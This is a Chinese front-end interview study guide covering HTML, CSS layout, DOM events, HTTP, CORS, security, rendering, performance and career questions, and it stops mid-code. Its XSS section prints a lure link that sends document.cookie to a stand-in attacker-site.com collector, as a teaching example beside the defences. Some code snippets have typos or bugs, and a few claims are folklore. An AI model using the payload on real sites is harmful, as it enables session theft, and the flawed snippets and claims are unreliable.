---
`title: 常用面试问题记录与分析
---

# interview

> 收录了经典前端面试题和解答



### 目录


[TOC]
### 简历

* 基本信息, 姓名-年龄-收集-邮箱-籍贯-博客-github
* 学历
* 工作经历, 时间-公司-岗位-职责-技术栈-业绩
* 开源项目, github和说明
* 兴趣, 和技术相近的兴趣



### 自我介绍

* 把握面试的沟通方向
* 豁达自信适度发挥





### 面试技巧



#### 面试要素

* 知识 
* 能力 
  * 项目把控能力, 业务分析能力, 抽象设计能力
* 经验



#### 面试流程

* 一面 基础知识, html, js, css
* 二面 基础知识延伸, 实现原理, 简历问的比较多
* 三面 一般不问技术, 职业生涯特色业务, 你推动了什么, 你改变了什么
* 终面 潜力, 沟通, 性格



#### 面试准备

* 职位分析
* 业务分析, 实战模拟
* 技术栈准备
* 自我介绍





### 一面

#### 基础知识



##### html

- **语意化标签**: section章节, article容器, nav导航, aside附加栏, header页头, main主题内容, footer页脚

- **替换元素**： input, select, img, 这类根据标签属性的元素

  **非替换元素**： div, span 这类根据内容显示的元素

- **meta标签都有哪些作用**


  - Web app

    这个meta的作用是让普通移动网页被添加到主屏幕后，拥有一些类native的功能, 就是类似隐藏ios的上下状态栏，实现全屏，禁止弹性拖拽，全屏，修改顶部颜色等

    ```html
    <meta name="apple-mobile-web-app-capable" content="yes">
    =======
    ```
  - dns预解析

    ```html
    <meta http-equiv="x-dns-prefetch-control" content="on">

    ```

  - 指定渲染引擎

    ```html
    <meta name="renderer" content="webkit">
    ```

  * 关键字

    ```html
    <meta name="keywords" content="">
    ```

  * 内容, 用于搜索引擎优化

    ```html
    <meta name="description" content="">
    ```

  * 指定视窗大小

    ```html
    <meta name="viewport" content="width=device-width">
    ```

- link标签除了引用css外, 还有什么作用

  - link标签 dns 预解析

    ```html
    <link rel="dns-prefetch" href="//static.123.com">
    ```

##### 阻塞

js的下载和执行会阻塞之后所有资源的下载

当css外部样式表后面跟着js资源之前时会阻塞



##### 页面布局

* **实现一个左右宽度300,高度已知, 中间自适应的布局, 各有什么优点, 缺点, 兼容性**

* **变形题: 实现一个上下高度固定, 中间高度自适应的页面**

  * 浮动, 缺点: 脱离文档流 ,带来混乱. 优点: 兼容性好

  * 绝对定位, 缺点: 脱离文档流 ,带来之后元素混乱. 优点: 兼容性好

  * flex布局 , 优点: 其中某个单元格高度增加, 其他单元格高度也增加. 缺点: 新特性兼容性不好

    ```css
    .container { display: flex; } 
    .center {flex: 1}
    ```

  * table 布局, 优点: 兼容性极好, 其中某个单元格高度增加, 其他单元格高度也增加

    ```css
    .container {display: table;} 
    .left, .right, .center {display: table-cell}
    ```

  * 网格布局, 优点: 先进的

    ```css
    .container {
        display: grid;
        width: 100%;
        grid-template-rows: 100px;
        grid-template-columns: 300px auto 300px;
    }
    ```

  * css计算属性

    ```css
    .left, .right {width: 300px;}
    .center {width: calc(100vw - 600px)}
    ```



##### css盒模型

* 标准盒模型, ie盒模型. 包括margin, border, padding, content

* 两者差别:计算宽度不同, css如何设置box-sizing: border-box/content-box;

* js如何获取和设置不同盒模型的宽高

  ```js
  // 只能获取内联样式(style)的宽高
  el.style.width/height
  // ie获取元素宽高
  el.currentStyle.width/height
  // 通用获取元素的宽和高
  window.getComputedStyle(el).width/height
  
  el.getBoundingClientReact().width/height/left/right
  ```




##### BFC 块级格式化上下文

* **bfc渲染规则**: 
  * 垂直方向不发生重叠 
  *  bfc区域不会与浮动元素重叠 
  * bfc在页面上是一个容器, 之外的元素不会影响内部元素, 内部也不影响外部元素.
* **bfc创建:** 
  * float值不为none,
  * position值不为static或relative 
  * display: table, table-cell 
  * overflow值不为visible
* **bfc使用场景**
  * 消除边距重叠
  * 解决浮动子元素无法撑开父元素高度



* **dom事件**

  * **dom事件的级别**

    * dom0 

      ```js
      el.onclick = function () {}
      ```

    * dom2 

      ```js
      el.addEventListener('click', function () {}, false) // 不使用事件捕获
      ```

    * dom3 , 增加了多种事件类型, 鼠标, 键盘等

      ```js
      el.addEventListener('keyup', function () {}, false)
      ```

  * **dom事件模型**

    * 捕获, 冒泡

  * **dom事件流**

    * 捕获阶段, 处于目标阶段, 冒泡阶段

  * **dom事件捕获的具体流程**

    * window , document, html(document.documentElement), body, target

  * **event对象常见应用**

    * 阻止默认行为 event.preventDefault() 
    * 阻止冒泡 event.stopPropagation()
    * 组织同一元素多个事件绑定其他事件的发生 event.stopImmediatePropagation()
    * event.currentTarget  事件绑定的dom对象
    * event.target 事件触发时的具体元素

  * **自定义事件**

    ```js
    var ev = new Event('custom') // var ev = new CustomEvent('custom', {name: 'a'})
    el.addEventListener('custom', function () {})
    el.dispatchEvent(ev)
    ```



##### http协议

* **http协议的主要特点**

  简单快速, 灵活, **无连接, 无状态**

* **https和http的主要区别**

    [介绍](https://www.jianshu.com/p/33feb2fadb15)

    - http默认端口80，https默认端口443

    - https在http基础上增加了网络安全层ssl协议, 分为对称加密和非对称加密, 比较多使用rsa算法为主的公钥加密技术

    - https的web服务器启用ssl需要获得一个公钥证书，并将该证书与要使用ssl的服务器绑定, 证书的目的是为了让客户端区分公钥是否伪造和属于谁的问题

* **http报文的组成成分**

    * **请求报文**: 
      - 请求行: http方法, 请求地址,http协议和版本 
      - 请求头 一些key, value值
      - 空行
      - 请求体
    * **响应报文:** 
      - 状态行
      - 相应头
      - 空行
      - 响应体

* **常用请求头**

    Accept, accept-encoding, host, referer, cookie, connection

* **常用响应头**

    Allow, Content-Length, Set-Cookie,Etag, content-type

* **http方法**
  * get 获取资源
  * post 传输资源
  * put 更新资源
  * delete 删除资源
  * head 获得报文首部

* **post和get区别**

  * get产生的url地址可被收藏, 而post不可以
  * get请求会被浏览器**主动缓存**, post不会
  * get只能url编码, 而post**支持多种编码**
  * get请求的url长度有限(过长截断), 而post没有
  * get比post更不安全, 参数通过url传递, post放在requestbody中

* **http状态码**

  * 1xx: 表示请求已接收, 继续处理

  * 2xx: 成功-请求已成功被接收
    * 200 请求成功
    * 206 部分请求成功(视频, 音频类的流文件)

  * 3xx: 重定向, 要完成请求需进一步操作
    * 301请求的页面已经永久转移到新的url
    * 302 临时转移
    * 304 资源未改动, 请求缓存
  * 4xx: 客户端错误
    * 400 请求的语法错误
    * 401 请求未授权
    * 403: 禁止访问
    * 404 资源不存在

  * 5xx: 服务器错误
    * 500 服务器内部错误
    * 503 服务器宕机或过载

* **什么是持久连接**

  * 1.1版本支持持久连接,非 keep-alive 模式时, 没请求一次都要断开重新连接, 当使用connection: keep-alive时, 可持续连接,必须基于 http1.1 的持久连接, 只有get和head才可以进行管线化

* **什么是管线化**
  * 管线化：请求1 -> 请求2 -> 请求3 -> 响应1 -> 响应 2....
  * 非管线化： 请求1 -> 响应1 -> 请求2 -> 响应2 -


##### 面向对象


* **类的声明, 生成实例**


    * 构造函数方式

  ```js
  function Animal(name) {this.name = name}
  ```


    * class关键字

  ```js
  class Animal {
      constructor (name) {
          this.name = name
      }
  }
  ```

  * 实例化

    ```js
    new Animal()
    ```

* **如何实现继承, 继承的几种方式**


  * **借助构造函数实现继承**

    缺点: 不能继承原型对象上的属性和方法

    ```js
    function Parent1() {
        this.name = 'parent'
    }
    // 不会继承原型链上的属性
    Parent1.prototype.say = function () {
        return this.name
    }
    function Child1() {
        // 关键: 借助构造函数
        Parent1.call(this);
        this.type = 'child'
    }
    new Child1().say() // 没有此方法,报错 error
    ```

  * **借助原型链实现的继承**

    缺点: 共享原型对象属性, 导致不同实例上对原型对象上属性的修改,对互相产生影响

    ```js
    function Parent2() {
        this.name = 'parent'
        this.arr = [1,2,3,4]
    }
    
    function Child2() {
        this.type = 'child'
    }
    // 关键: 借助原型链
    Child2.prototype = new Parent2
    
    var child = new Child()
    var child2 = new Child()
    console.log(child.constructor) // Parent2
    
    child.arr.push(5)
    console.log(child2.arr) // 共享原型属性 [1,2,3,4,5]
    ```

  * **组合式继承**

    缺点: 父类调用两次

    ```js
    function Parent3() {
        this.name = 'parent'
    }
    
    function Child3() {
        Parent3.call(this)
        this.type = 'child'
    }
    
    Child3.prototype = new Parent3()
    
    // 优化1: 组合继承(父类只调用一次), 缺点: constructor无法正确指向
    Child3.prototype = Parent3.prototype
    
    // 优化2: 组合继承(父类只调用一次), constructor也能正确指向
    Child3.prototype = Object.create(Parent3.prototype)
    Child3.prototype.constructor = Child3
    ```

  * **寄生式继承**

    缺点: 子类原型对象无法继承

    ```js
    function Parent4() {
        this.name = 'parent4'
    }
    
    function Child() {
        var obj = new Parent4
        obj.type = 'child'
        return obj
    }
    ```




##### 原型链

* **创建对象的几种方法**

  * **对象字面亮**

    ```js
    var obj = {a: 1}
    var obj2 = new Object({a: 1})
    ```

  * **构造函数**

    ```js
    function Car() {}
    var obj = new Car()
    ```

  * **Object.create**

    ```js
    var proto = {a: 1}
    var instance = Object.create(proto)
    ```

* **原型, 构造函数, 实例, 原型链**

* **instanceof原理, constructor**

* **new 运算符**

  * 会创建一个object 然后把此object的原型链链接到构造函数的prototype对象上
  * 执行构造函数, 把this绑定到此对象上
  * 如果此函数没有反回对象, 那么new运算符的结果就是此对象



##### 通信

* **什么是同源策略即限制**

  * 源: 协议, 域名(包括子域名不一致), 端口不一致

    例子: a.interview.com 访问interview.com属于**跨域**, interview.com访问a.interview.com**也是跨域**

  * 同源策略限制从一个源加载的文档或脚本如何与来自另一个源的资源进行交互.这是一个隔离潜在恶意文件的安全机制.

  * 具体限制: cookie, localStorage 和 indexDB 无法读取, dom无法获得, ajax无法发送(或成功发送浏览器并不响应)

* **前后端如何通讯**

  * ajax (fetch)

  * websocket 支持跨域

  * cors 

* **如何创建ajax(兼容性)**

  XMLHttpRequest, ActiveXObject

  ```js
  var xhr = new XMLHttpRequest()
  xhr.open('post', url, ture) // 参数3: 是否为异步请求
  xhr.onload = function() {
      if ([200, 304, 206].includes(xhr.status)) {
          
      }
  }
  // or onreadystatechange(0未打开,1未发送,2已获取相应头,3正在下载响应体,4请求完成)
  xhr.send(data)
  ```

* **跨域通讯的几种方式**

  浏览器会自动拦截跨域ajax请求, 并添加origin发送跨域通信

  出于安全原因，浏览器限制从脚本内发起的跨源HTTP请求。 例如，XMLHttpRequest和Fetch API遵循同源策略。 这意味着使用这些API的Web应用程序只能从加载应用程序的同一个域请求HTTP资源，除非使用CORS头文件. 这段描述不准确，**并不一定是浏览器限制了发起跨站请求，而也可能是跨站请求可以正常发起**，但是返回结果被浏览器拦截了。

  - **cors(跨域的ajax)**

    跨域资源共享CORS 是一种机制，它使用额外的 HTTP头来告诉浏览器  让运行在一个 origin (domain) 上的Web应用被准许访问来自不同源服务器上的指定的资源。当一个资源从与该资源本身所在的服务器**不同的域或端口**请求一个资源时，资源会发起一个**跨域 HTTP 请求**

    跨域资源共享标准新增了一组 HTTP 首部字段，允许服务器声明哪些源站通过浏览器有权限访问哪些资源

    跨域资源共享标准新增了一组 HTTP 首部字段，允许服务器声明哪些源站通过浏览器有权限访问哪些资源。另外，规范要求，对那些可能对服务器数据产生副作用的 HTTP 请求方法（特别是 `GET`以外的 HTTP 请求，或者搭配某些 MIME 类型的 `POST`请求，浏览器必须首先使用 `OPTIONS`方法发起一个预检请求（preflight request），从而获知服务端是否允许该跨域请求。服务器确认允许之后，才发起实际的 HTTP 请求。在预检请求的返回中，服务器端也可以通知客户端，是否需要携带身份凭证（包括 Cookies和 HTTP 认证相关数据）

    * **cors的请求头**

      这些首部字段无须手动设置。 当开发者使用 XMLHttpRequest 对象发起跨域请求时，它们已经被设置就绪

      * **origin**

        ```js
        Origin: <origin>
        ```

      * **Access-Control-Request-Method**

        首部字段用于预检请求。其作用是，将实际请求所使用的 HTTP 方法告诉服务器

      * **Access-Control-Request-Headers** 

        其作用是，将实际请求所携带的首部字段告诉服务器

    * **cors响应头**

      * **Access-Control-Allow-Origin: ***

        origin 参数的值指定了允许访问该资源的外域 URI, * 表示所有

      * **Access-Control-Allow-Methods**

        首部字段用于预检请求的响应。其指明了实际请求所允许使用的 HTTP 方法

      * **Access-Control-Allow-Credentials**

        头指定了当浏览器的`credentials`设置为true时是否允许浏览器读取response的内容

      * **Access-Control-Allow-Headers**

        用于预检请求的响应。其指明了实际请求中允许携带的首部字段

      * **Access-Control-Expose-Headers**

        在跨域访问时，XMLHttpRequest对象的getResponseHeader()方法只能拿到一些最基本的响应头，Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma，如果要访问其他头，则需要服务器设置本响应头

  * **jsonp**

    利用script标签的跨域加载

    ```html
    <script src="https://abc.com/js/?data=123&callback=jsonp"></script>
    <script>
        jsonp({
            data: {}
        })
    </script>
    ```

    js发送jsonp

    ```js
    var script = docuement.createElement('script')
    script.insertBefore(document.body)
    script.onload = function () {
    	callback()
    }
    ```

  * **hash**

    利用window.onhashchange

    ```js
    var iframe = document.createElement('iframe')
    iframe.src = 'http://123.com#6778'
    
    // 123.com
    window.onhashchange = function () {
        var data = window.location.hash
    }
    ```

  * **postMessage**

    ```js
    var win = window.open('a.com')
    win.postMessage('data')
    
    // a.com
    window.addEventListener('message', function (event) {
        console.log(event.origin, event.source, event.data)
    })
    ```

  * **webSocket**

    ```js
    var ws = new WebSocket('wss://echo.websocket.org')
    ws.onopen = function () {}
    ws.onmessage = function (event) {console.log(event.data)}
    ws.onclose = function () {}
    ```


##### 安全

* **csrf (跨站请求伪造)**

  * 在用户注册过的网站A登录过, 并下发cookie
  * 在恶意网站B诱导用户点击目标网站A的链接(接口存在漏洞), 或者恶意网站存在指向目标网站A的链接(iframe 或者 image)。
  * 当用户在打开了A网站的同时访问了B， 因为B中有含有A的链接， 此时A的cookie将被发送

  **防御:** 

  * token验证
  * referer验证, 请求是否从可信站点发起

* **xss(跨域脚本攻击)**

  * **定义**：XSS 攻击， 通常指 黑客 通过“ HTML 注入” 篡改 了 网页， 插入 了 恶意 的 脚本， 从而 在用 户 浏览 网页 时， 控制 用户 浏览器 的 一种 攻击。

  * **危害**：XSS 攻击 带来 的 不光 是 Cookie 劫持 问题， 还有 窃取 用户 信息、 模拟 用户 身份 执行 操作 等 诸多 严重 的 后果。

  * **例如**：

    * 用户通过提交表单等， 向页面注入恶意脚本

    * 在页面插入恶意脚本， 进行cookie劫持

      ```html
      <a href=# onclick=\”document.location=\’http://attacker-site.com/xss_collect?m=\’+escape\(document.cookie\)\;\”>快看, 这里有美女在洗澡</a>
      ```

  **防御**:

  * 给cookie增加http only的属性 （客户端无法通过document.cookie获取到）， 该方法并非全面防御xss，仅防御cookie劫持
  * 过滤用户输入
  * 检查输出
  * 定时更换sessionid

##### 算法

* 排序
  * 快速排序
  * 选择排序
  * 希尔排序
  * 冒泡排序
* 堆栈, 队列, 链表
* 递归
* 波兰式和逆波兰式





### 二面

#### 渲染机制

* **doctype及作用**

  * DTD文档类型定义, 浏览器使用它来判断文档类型, 决定使用何种协议来解析和切换浏览器模式
  * doctype是用来声明文档类型和dtd规范的

  文档类型

  * html5, 
  * html4.01strict模式, 包含所有html元素属性,**不包含**展示性和弃用的元素(比如front)
  *  html4.01传统模式（怪异模式） 包含所有html元素属性, 也**包含**弃用元素

* **浏览器的渲染过程**

  * html - html parse 解析- **dom tree**
  * style - css parse 规则解析 - **style-rules**
  * style rules 和 **dom tree** 整合, 变为 **render tree**(渲染树), 浏览器**layout**决定元素的位置和大小, 绘制页面(**painting**)

* **重排reflow**

  dom 中每个元素都有自己的盒子, 这些都需要浏览器计算放到他们应有的**位置**, 此过程重排**reflow**

  **触发reflow**

  * 增加, 删除, 修改dom节点时

  * 移动dom的位置

  * 修改css样式的时候(宽高,display)

  * resize窗口的时候

  * 修改网页默认字体

* **重绘repaint**

  dom位置, 大小确定后, 展现在屏幕上的过程称为repaint

  **触发repaint**

  * dom改动

  * css改动

  **减少repaint次数方法**

  使用 **createDocumentFregment**创建节点, 一次性加入页面

* **浏览器在输入url敲回车后发生了什么?**

  * DNS域名解析；
  * 建立TCP连接；
  * 发送HTTP请求；
  * 服务器处理请求；
  * 返回响应结果；
  * 关闭TCP连接；
  * 浏览器解析HTML；
  * 浏览器布局渲染；

  **步骤详解**

  * 建立tcp连接

    ![tcp三次握手](./imgs/tcp.jpg)

  * 发送http请求

    ![http-request](./imgs/http_request.jpg)

  * 关闭tcp连接

    ![closeLink](./imgs/closeLink.jpg)




#### js运行机制

* **什么是单线程?**

  javascript同一时间只能做一件事情

* **什么是任务队列?**

  js分为同步任务和异步任务, 同步任务在主线程(执行栈)执行, 当主线程没有任务可以执行时, 异步任务从异步队列中取出执行

  * 同步任务
    * console, if, while, 
  * 异步任务
    * setTimeout, setInterval,dom事件, promise

* **什么是event loop(事件循环)?**

  Event Loop 是一个很重要的概念，指的是计算机系统的一种运行机制, **Event Loop是一个程序结构，用于等待和发送消息和响应事件**

  每当遇到I/O的时候，主线程就让Event Loop线程去通知相应的I/O程序，然后接着往后运行，所以不存在红色的等待时间。等到I/O程序完成操作，Event Loop线程再把结果返回主线程。主线程就调用事先设定的回调函数，完成整个任务

* **宏任务和微任务的定义和优先级?**

  setInterval, setTimeout是宏任务, 比**promise, process.nextTick**这种微任务慢

  ```js
  setTimeout(() => console.log(0), 0)
  new Promise(resolve => {
      resolve()
      console.log(1)
  }).then(res => {
      console.log(2)
  })
  console.log(3)
  
  // 1, 3, 2, 0
  ```




#### 页面性能

* **整个前端性能提升分为哪几类，分别列出提升页面性能的方法?**

  资源请求类（压缩合并请求，按需请求）， 资源缓存类， js算法类（动画， 递归等）

  * **资源压缩合并, 减少http请求**

  * **非核心代码异步加载 -- 异步加载的方式 -- 异步加载的区别**

    异步加载的方式

    * **动态创建脚本  createElement('script')** 
    * defer 是在**html解析完之后(domContentLoaded事件)**才会执行, 如果多个, 按照顺序依次执行
    * async 是在**加载完之后立即执行**, 如果是多个, 和声明顺序**无关**

  * 利用浏览器**缓存** -- 缓存的分类 -- 缓存的原理

    ![缓存流程](./imgs/caches.png)

    分类

    * **强缓存**(优先级较高): 请求浏览器直接使用已有的缓存， 两者都有以cache-control为准

      * Expires   `Expires: Thu 21 Jan 2018 ..`(以服务器的绝对时间为准)
      * Cache-Control (优先级最高)    `Catch-Control: max-age=3600`(以客户端拿到文件3600秒为止)

    * **协商缓存**: 不确定是否使用,  先和服务器沟通再决定是否使用， 服务器接收请求会对比以下字段

      在 第二次 请求 的 时候， 浏览器 会把 这个 Last- Modified 带上， 变成 If- Modified- Since 字段，

      如果已有直接返回304

      * Last-Modified 
      * Etag
      * if-None-matchd

    |              | **获取资源形式** | **状态码**          | **发送请求到服务器**                       |
    | ------------ | ---------------- | ------------------- | ------------------------------------------ |
    | **强缓存**   | 从缓存取         | 200（from cache）   | 否，直接从缓存取                           |
    | **协商缓存** | 从缓存取         | 304（not modified） | 是，正如其名，通过服务器来告知缓存是否可用 |

  * **使用cdn**

  * **dns预解析**

    ```html
    <meta http-equiv="x-dns-prefetch-control" content="on">
    <link rel="dns-prefetch" href="//host_name_to_prefetch.com">
    ```

* **动画性能**

  实现动画的方式: 1.js控制dom动画, 2.svg动画(path), 3. canvas + css3 动画

  使用硬件加速优化页面性能， 默认transform， transition 不使用3d加速， 但transform3d使用3d加速



#### 错误监控

* **前端错误分类**

  * **及时运行错误(代码错误)**

    * try ... catch
    * window.onerror(只能捕获及时运行错误, 不能捕获资源错误)

  * **资源加载错误(不会冒泡, 但会捕获)**

    * object.onerror

    * **performance.getEntries(),** 返回一个数组, 内含有成功加载的资源. 

    * Error事件捕获

      ```js
      window.addEventListener('error', function (e) {
          console.log(e)
      }, true)
      
      throw new Error
      ```

* **错误的捕获方式(如何保证产品质量)**


* **跨域js文件错误处理**

  * 客户端script增加**crossorigin属性**

  * 服务端资源响应增加**Access-Control-Allow-Origin: ***

    如果没有上述两个设置， 跨域js不会报错


* **上报错误的基本原理**

  * 采用Ajax通信的方式上报

  * 利用Image对象上报

    ```js
    new Image().src = 'http://error.com/test?error=123'
    ```





### 三面



#### 专业素养

* 业务能力
* 团队协作能力
* 事物推动能力
* 带人能力
* 其它能力



#### 业务能力

* 我做过什么?
* 负责的业务有什么业绩
* 使用了什么技术方案
* 突破了什么技术难点
* 遇到了什么问题
* 最大的收获是什么

#### DEMO

* 独立负责360彩票走势图开发
* 历时三周完成所有采种开发, 用户量上涨15%
* 区别常规canvas方案, 使用vml + svg方案
* 解决了走势图高级绘图板的开发
* 橡皮擦的问题, 动态连线计算等
* 对业务的理解更加深入, 对技术图表更有把握



#### 团队协作能力



#### 事物推动能力

* 对历史算法更新换代
* 推动专题的cms架构
* 主导客服系统建设
* 完成多项专利申请



#### 带人能力

代码规范, code review



组织能力, 学习能力, 行业能力



#### 项目分析



##### 大数据营收系统

**项目任务：** 

* **整体项目框架搭建**，包括文件结构组织，以来模块的引入，webpack配置，vue-router路由全局钩子，axios全局拦截器设置， 代码规范检查设置 （组长做的比较多， 其他每个组员都有分工）
* **highChart 各种图表初始化参数的配置**（每个人员根据自身分配的路由页面， 来进行配置， 如果有和他人重叠的地方，互相沟通）

* **element-ui主题定制**， 特色开发（这个由我来做， 主要修改了element-variables.scss文件的配置， 和不同组件对应的css文件修改）

* **公共组件的开发**（对于页面中出现频率较高的组件， 例如日期筛选栏， 数字表盘， 排行榜等）协同开发

* **个人分配的路由页面开发**

**项目业绩 ：**

公司通过分析用户喜好和营收数据，2018年调整战略， 营业额持续提升 

**整体方案:**



**难点**

* 第一次协同开发， 对git的合并， 提交比较生疏， 对gitflow流程不太熟悉

  克服： 参看网上教程， 对git命令多使用， 不懂的问组长

* 对于设计图给出但highchart无法实现的需要通过dom动画的方式来模拟， 并封装成公共组件进行调用， 这其中还需要考虑数据极差比较大的情况下对小数据的良好显示，动画的平滑过渡 

**收获**

* 代码规范提高， 协同开发能力提升

* 对Vue的使用， hightChartjs的配置熟悉， 公共组件的抽象能力提高

* 对业务理解力， 业务处理能力都有显著提高



##### wall.e 开源硬件机器人项目

**技术方案：**

 页面Vue, 服务端采用express搭建服务器接受请求, johnny-five开源库操纵各个传感器和硬件io

**功能：**

* 局域网/公网下远程遥控前后左右
* 视频实时传输
* 温度采集与持久保存
* 加速度测量
* gps定位（因为硬件端口冲突未实现）



**思路&亮点**

采用分布式思想, 服务器, 页面, 数据分别存在不同位置

客户端与智能硬件之间采用动态连接

通信协议采用websocket 保证实时传输的延迟较低

可以使用公网/局域网模式




**难点**


* nodejs调试和硬件调试比较困难, 错误难以定位,日志难以分析

  克服: 上网查找nodejs的调试方法,学会使用node-inspector

* 服务器文件运行在开发板上, 文件同步比较困难, 每次更改需要手动ftp传到开发板上,或者直接在开发板上编辑并运行代码, 但这样比较卡

  客服: 用nodejs的fs.watch api 监听开发目录变化, 当文件变动自动执行process.exec 内传入的ftp命令, 开发板使用forever或者pm2守护进程, 当代码更改自动重启服务器

* 页面温度计能根据传感器的输入改变颜色和长度, 其中使用canvasapi 绘制温度计, 写了一个函数把温度作为输入, 颜色和长度作为输出, 调整温度计的变化



##### Colorful.css 

根据用户选择主题色, 生成可定制的css, 有网页版本和命令行版本



使用的技术: 动态创建样式技术,  node命令行

收获 熟悉了node怎样编写一个命令行软件, 怎么创建并发布一个npm包





### 四面



##### 关键点

* 乐观积极自信
* 主动沟通
* 逻辑顺畅
* 上进有责任心
* 有主张, 做事果断



##### 职业竞争力

* 业务能力
* 思考能力
* 学习能力
* 无上限的付出, 责任



##### 职业规划

* 目标是什么

  在业务上称为专家, 在技术上称为行业大牛

* 近阶段的目标

  不断的学习积累个方面的经验, 以学习为主

* 长期目标

  做几件很有价值的事情, 比如开源作品, 技术框架等

* 方式方法

  先完成业务上的主要问题, 做到极致, 然后逐步向目标靠拢



### Tips

* **找到数组里面最小的数 (es5 / es6)**

  ```js
  // es6
  Math.min(...arr)
  // es5 1.for循环 2.sort后取第一项
  ```

* **数组去重非indexOf(使用对象， 空间换取时间, 因为object在js中是以hash实现的， 访问键值比遍历数组更快)**

  ```js
  const arr = [1,2,3,3]
  function unique(arr) {
      let ret = []
      let table = {}
      arr.forEach(item => {
          if (table[JSON.stringify(item)]) {
              return
          } else {
              table[item] = true
              ret.push(item)
          }
      })
      return ret
  }
  
  // 字符串去重
  [...new Set('aabbcde')].join('') // abcde
  ```

* **html表单可以跨域吗？**

  可以 

  因为原页面用 form 提交到另一个域名之后，原页面的脚本无法获取新页面中的内容。

  所以浏览器认为这是安全的。

  而 AJAX 是可以读取响应内容的，因此浏览器不能允许你这样做。

  如果你细心的话你会发现，其实请求已经发送出去了，你只是拿不到响应而已

* **get和post请求的本质区别**

  get只发送一个tcp包， 而post发送两个

* **搜索请求中文如何请求**

  get请求使用URL编码`encodeURI`并接受ASCII编码字符, post请求对格式无要求

* **观察者和订阅-发布的区别，各自用在哪里**

  ![发布订阅/观察者](./imgs/observer-pubSub.png)

  * 观察者模式：一个对象（称为subject）维持一系列依赖于它的对象（称为observer），将有关状态的任何变更自动通知给它们（观察者）。

  * 发布/订阅模式：基于一个主题/事件通道，希望接收通知的对象（称为subscriber）通过自定义事件订阅主题，被激活事件的对象（称为publisher）通过发布主题事件的方式被通知。

    两种模式都存在订阅者和发布者（具体观察者可认为是订阅者、具体目标可认为是发布者），但是观察者模式是由具体目标调度的，而发布/订阅模式是统一由调度中心调的，所以观察者模式的订阅者与发布者之间是存在依赖的，而发布/订阅模式则不会

* **介绍中介者模式**

  用一个中介对象来封装一系列的对象交互。中介者使得各个对象不需要显示地相互引用，从而使其耦合松散，而且可以独立的改变它们之间的交互

  * 现实应用: 电脑主板， 房产中介
  * 软件应用: MVC架构下的Controller， JQuery对象对内是个中介者， 对外是个单例

* **介绍粘性定位 position: sticky**

  [demo](https://codepen.io/zexiplus/pen/zydVKR)

  ```css
  .title {
      position: sticky;
      top: 10px;
  }
  ```

  在 viewport 视口滚动到元素 top 距离小于 10px 之前，元素为相对定位。之后，元素将固定在与顶部距离 10px 的位置，直到 viewport 视口回滚到阈值以下, 必须指定top, left, right, bottom其中之一，否则视为相对定位

* **按需引入是怎么实现的** 例如`import {Button} from 'components' `

  **babel-plugin-component** 把 代码 `import {Button} from 'components' ` 转化为 

  ```js
  var buton =require('components/lib/button');
  require('components/lib/button/style.css');
  ```

* **http报文有哪些部分？**

  起始行(start line)  空行  首部(header)  主体（body）

  ```http
  HTTP/1.0 200 OK    //起始行
  
  Content-type:text/plain    //首部
  Content-length:19            //首部  
  
  Hi I'm a message!    主体
  ```

* **cookie存放在哪里？能做的事情和存在的价值**

  cookie分为session-cookie(不设置过期时间，存在内存中，关掉浏览器则清空)和thirdpart-cookie(有过期时间，存放在系统硬盘上)

  cookie有效的作用域为当前文件目录以及子目录 `http://abc.com/abc`生成的cookie可以使用在`http://abc.com/abc/123`但不能在`http://abc.com/cde`使用

  * **path**：表示 cookie 影响到的路径，匹配该路径才发送这个 cookie。

  * **expires** 和 maxAge：告诉浏览器这个 cookie 什么时候过期，expires 是 UTC 格式时间，maxAge 是 cookie 多久后过期的相对时间。当不设置这两个选项时，会产生 session cookie，session cookie 是 transient 的，当用户关闭浏览器时，就被清除。一般用来保存 session 的 session_id。

  * **secure**：当 secure 值为 true 时，cookie 在 HTTP 中是无效，在 HTTPS 中才有效。

  * **httpOnly**：浏览器不允许脚本操作 document.cookie 去更改 cookie。一般情况下都应该设置这个为 true，这样可以避免被 xss 攻击拿到 cookie

* **柯里化函数两端的参数具体是什么东西**

* **服务端渲染SSR**

  Vue.js 是构建客户端应用程序的框架。默认情况下，可以在浏览器中输出 Vue 组件，进行生成 DOM 和操作 DOM。然而，也可以将同一个组件渲染为服务器端的 HTML 字符串，将它们直接发送到浏览器，最后将这些静态标记"激活"为客户端上完全可交互的应用程序。

  服务器渲染的 Vue.js 应用程序也可以被认为是"同构"或"通用"，因为应用程序的大部分代码都可以在服务器和客户端上运行

  **优点：**

  * 更好的 SEO，由于搜索引擎爬虫抓取工具可以直接查看完全渲染的页面
  * 更快的内容到达时间(time-to-content)，无需等待js下载完成

  **缺点：**

  * 开发条件受限， 例如生命钩子函数只能执行beforeCreated 和 created
  * 需要nodejs执行环境或至少有javascript解析引擎
  * 服务器负载更大， 相比静态资源服务器运算量增加

* **移动端适配1px问题**

  * 问题产生的原因:

    css设置`width: 1px`, 在dpr(物理像素与显示像素的比值)为2 的设备上显示 2个物理像素, 如果想设置1个物理像素的宽度, `width: 0.5px`在有些设备上无效

  * 解决方案：

    * 通过dpr(`window.devicePixelRatio`)设置viewport的initialscale

      ```js
      let dpr = window.devicePixelRatio
      let scale = 1/dpr
      let viewportHead = `<meta name="viewport" content="initial-scale=${scale}, maxium-scale=${scale}, user-scalable=no">`
      document.head.appendChild(viewportHead)
      ```

    * 通过dpr给元素重写样式

      ```js
      let dpr = window.devicePixelRatio;
      if (dpr && dpr > 2) {
          div.classList.add('dpr2')
      }
      ```

      ```css
      div.dpr2 {
          transform: scale(50%);
      }
      ```

* **webpack常用loader和plugins举例**

  * plugins

    * html-webpack-plugin: html入口生成
    * clean-webpack-plugin: 清理dist文件
    * extract-text-webpack-plugin 分离文件
    * HotModuleReplacementPlugin 热替换
    * providerPlugin 处理第三方库文件

  * loaders

    * file-loader 处理资源路径

    * style-loader, css-loader, less-loader, scss-loader 处理样式预编译

    * vue-loader 加载编译vue组件

    * babel-loader 转化代码至es5

    * mocha-loader

* **怎么将dom类数组转变为数组**

  ```js
  var arr = Array.from(document.querySelectorAll('div'))
  ```



* **`content-type : multipart/form-data` 和  `application/x-www-form-urlencoded` 有什么区别**

  * `application/x-www-form-urlencoded`： 窗体数据被编码为名称/值对。这是标准的编码格式

  * `multipart/form-data`： 窗体数据被编码为一条消息，页上的每个控件对应消息中的一个部分，这个一般文件上传时用

* **node加载模块(require)的优先级**

  缓存模块 > 原生模块 > 文件模块


* **对async、await的理解，内部原理**

  * async, await用法

    ```js
    async function say(greeting){
        return new Promise(function(resolve, then){
